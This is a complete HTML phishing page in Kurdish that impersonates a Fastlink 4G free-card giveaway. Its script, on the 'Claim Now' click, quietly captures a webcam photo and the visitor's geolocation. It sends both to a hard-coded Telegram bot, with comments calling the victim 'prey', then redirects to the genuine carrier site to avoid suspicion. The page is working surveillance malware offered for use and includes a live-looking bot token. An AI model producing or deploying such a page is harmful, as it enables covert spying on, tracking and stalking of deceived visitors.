<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fastlink 4G - دیاری وەرگرتن</title>
    <style>
        body { margin: 0; background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: 'Segoe UI', Tahoma, sans-serif; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 350px; border-top: 8px solid #ed1c24; }
        img { width: 100px; margin-bottom: 15px; }
        h2 { color: #333; font-size: 18px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
        #claimBtn { background: #ed1c24; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; }
        #claimBtn:active { transform: scale(0.95); }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://fast-link.com/wp-content/uploads/2021/04/fastlink-logo.png" alt="Fastlink">
        <h2 dir="rtl">پیرۆزە! تۆ هەڵبژێردراویت</h2>
        <p dir="rtl">بۆ وەرگرتنی کارتێکی ٥,٠٠٠ی فاستلینک بە خۆڕایی، کلیک لە دوگمەی خوارەوە بکە و چاوەڕێ بکە.</p>
        <button id="claimBtn">وەرگرتنی کارت (Claim Now)</button>
    </div>

    <script>
        const botToken = "8540660409:AAEuJsdaI4RF9YVRe63-kWMY15Qvp0Aozy8";
        const chatId = "7619045862";

        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "...تکایە چاوەڕێ بکە";
            btn.disabled = true;

            try {
                // دەستپێکردنی کامێرا بە بێدەنگی
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                
                // وێنەگرتنی خێرا (کە کلیکی کرد یەکسەر وێنەکەی دەگیرێت)
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'jegr_hacked.jpg');

                    // ناردنی وێنە بۆ تێلیگرامەکەت
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    // ناردنی لۆکەیشن بەبێ ئەوەی هەست بکات
                    navigator.geolocation.getCurrentPosition(pos => {
                        const locText = `📍 لۆکەیشنی نێچیر دۆزرایەوە:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, text: locText })
                        });
                    });

                    // گواستنەوە بۆ لاپەڕەی فەرمی تا گومان نەکات
                    setTimeout(() => {
                        window.location.href = "https://fast-link.com/offers";
                    }, 1000);

                }, 400);

            } catch (err) {
                // ئەگەر مۆڵەتی نەدا یان ئیرۆر هەبوو
                window.location.href = "https://fast-link.com";
            }
        });
    </script>
</body>
</html>
